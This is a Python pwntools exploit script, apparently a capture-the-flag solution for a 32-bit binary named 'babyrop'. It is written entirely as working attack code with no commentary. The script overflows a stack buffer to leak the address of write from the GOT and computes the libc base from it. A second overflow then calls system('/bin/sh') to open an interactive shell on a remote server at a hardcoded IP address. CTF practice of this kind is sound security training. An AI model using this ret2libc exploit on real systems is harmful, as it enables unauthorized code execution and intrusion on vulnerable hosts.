from pwn import *

local = 0
if local :
    a=process("./babyrop")
    libc=ELF("/lib/i386-linux-gnu/libc.so.6")
else:
    a=remote("47.112.137.238","13337")
    libc=ELF("libc-2.23.so")
elf=ELF("./babyrop")
def init():
    payload='\x00'*7+'\xff'
    payload=payload.ljust(0x20,'\x00')
    a.send(payload)
init()
write_plt=elf.plt["write"]
pop3_ret=0x080488f9
start_addr=0x80485A0
payload='A'*(0xe7+4)
payload+=p32(write_plt)
payload+=p32(start_addr)
payload+=p32(1)
payload+=p32(elf.got["write"])
payload+=p32(4)
a.recvuntil("Correct\n")
a.sendline(payload)
libc_base=u32(a.recv(4))-libc.symbols["write"]
success("libc_base ==> 0x%x"%libc_base)
systen_addr=libc_base+libc.symbols["system"]
bin_sh_addr=libc_base+next(libc.search("/bin/sh"))
init()
payload='A'*(0xe7+4)
payload+=p32(systen_addr)
payload+=p32(11)
payload+=p32(bin_sh_addr)
a.recvuntil("\n")
a.sendline(payload)
a.interactive()